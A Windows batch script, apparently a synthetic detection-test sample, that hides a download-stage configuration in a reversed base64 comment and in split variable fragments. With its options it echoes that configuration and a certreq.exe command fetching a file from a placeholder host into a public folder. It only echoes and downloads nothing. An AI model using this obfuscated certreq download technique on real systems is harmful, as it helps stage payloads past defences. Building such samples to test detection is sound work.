@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse
rem HUNTRESS-MATERIAL:dGFkLmZhMTgxNDUwYzgtZWdhdHNcYmFMc3NlcnRudUhcY2lsYnVQXHNyZXNVXDpDPWh0YXBfZWxpZnx0YWQuMmJjZjcwOTAvZGlsYXZuaS5lbHBtYXhlLmZhMTgxNDUwYzgvLzpzcHR0aD1scnV8ZmExODE0NTBjOC1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xlbm9uPWVnYXVnbmFsX3R4ZW58dHVvX25hZj1ocGFyZ3wxPXRudW9jX2VnYXRzfGV4ZS5xZXJ0cmVjPXJldHBhZGF8ZWxpZl9ldGlydyxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
SeT "fragment0=v=1|steps=acquire_remote,write_file|adapter=certreq.exe|stage_"
SeT "fragment1=count=1|graph=fan_out|next_language=none|campaign_id=campaign-"
SeT "fragment2=8c054181af|url=https://8c054181af.example.invalid/0907fcb2.dat"
SeT "fragment3=|file_path=C:\Users\Public\HuntressLab\stage-8c054181af.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=6ea258e8"
ver >nul
if errorlevel 1 exit /b 1
call set "recovered_configuration=%%fragment0%%%%fragment1%%%%fragment2%%%%fragment3%%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo certreq.exe acquire https://8c054181af.example.invalid/0907fcb2.dat to C:\Users\Public\HuntressLab\stage-8c054181af.dat
exit /b 0
